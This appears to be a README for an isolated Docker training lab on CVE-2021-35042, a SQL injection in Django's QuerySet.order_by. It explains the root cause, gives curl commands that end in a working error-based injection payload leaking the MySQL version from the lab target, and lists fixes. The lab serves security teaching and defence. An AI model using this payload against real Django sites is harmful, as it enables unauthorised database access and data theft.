# Django QuerySet.order_by Raw Column SQL Injection (CVE-2021-35042)

## Laboratory Overview

This laboratory provides an isolated, production-grade practice target for studying **Django QuerySet.order_by Raw Column SQL Injection (CVE-2021-35042)** (CVE-2021-35042).

- **Target Directory**: `Classes/02_web_penetration_tester/16_advanced_sql_injection/django_cve_2021_35042`
- **Default Port(s)**: `8237:8000`
- **CLI Shortcut**: `./lab start django-orderby-sqli`

---

## Architecture & Service Map

- **Containers**:
  - `cyberlab_02_django_35042_app` (Django 3.2.4 web application running on port 8000, mapped to host port 8237)
  - `cyberlab_02_django_35042_db` (MySQL 5.7 backend database)
- **Network Mode**: Bridge (Isolated Docker network)
- **Resource Ceiling**: 1024 MB RAM limit

---

## Vulnerability Mechanics

In Django QuerySet, `order_by()` takes column names or field expressions to order results. In Django 3.1.x before 3.1.13 and 3.2.x before 3.2.5, when column names containing dotted expressions (such as `vuln_collection.name` representing `table.column`) were passed into `order_by()`, Django did not properly sanitize or validate the column path. Instead, unchecked raw expressions were appended directly to the generated SQL `ORDER BY` clause.

Because user-supplied input was directly passed to `order_by(request.GET.get('order'))`, an attacker could inject arbitrary SQL syntax by escaping out of the table/column reference via closing parentheses and semicolon/comments (e.g. `vuln_collection.name);select updatexml(1, concat(0x7e,(select @@version)),1)%23`), resulting in Error-based or Out-of-band SQL Injection.

### Technical Root Cause

The regular expression and token-filtering logic used by Django to distinguish valid column references allowed dotted identifiers (introduced in Django 3.1 to support ordering by table columns in subqueries and aggregations) without strictly ensuring they adhered to safe alphanumeric identifiers, thereby allowing SQL statement injection through column path parameters.

---

## Verification & Exploitation Guide

### 1. Verify Application Availability

Check that the Django web application is up and returns HTTP 200:

```bash
curl -s -i "http://localhost:8237/"
```

### 2. Verify Normal Ordering by Field

Test normal ordering by ID descending:

```bash
curl -s "http://localhost:8237/vuln/?order=-id"
```

### 3. Verify Dotted Column Path Ordering

Test ordering using the dotted column path syntax:

```bash
curl -s "http://localhost:8237/vuln/?order=-vuln_collection.name"
```

### 4. Exploit Error-Based SQL Injection

Send the SQL injection payload via the `order` parameter to extract the MySQL database version:

```bash
curl -s "http://localhost:8237/vuln/?order=vuln_collection.name);select%20updatexml(1,concat(0x7e,(select%20@@version)),1)%23"
```

The response will contain the MySQL error message disclosing the database version (e.g., `XPATH syntax error: '~5.7.xx'`).

---

## Defensive Remediation & Hardening

- Upgrade Django to patched versions: `3.2.5+`, `3.1.13+`, or `2.2.24+`.
- Never pass unvalidated user input directly into `order_by()`.
- Implement strict allowlisting for permitted sorting fields in view controllers.

---

## References & Advisories

- **Official Vulhub Repository**: [Vulhub CVE-2021-35042](https://github.com/vulhub/vulhub/tree/master/django/CVE-2021-35042)
- **Django Security Advisory**: [Django security releases: CVE-2021-35042 (July 1, 2021)](https://www.djangoproject.com/weblog/2021/jul/01/security-releases/)

---

## Verified Video Walkthrough

- **Video Title**: [Django #sqli | CVE-2021-35042](https://www.youtube.com/watch?v=GLdqXN7pNrU)
- **Direct URL**: https://www.youtube.com/watch?v=GLdqXN7pNrU
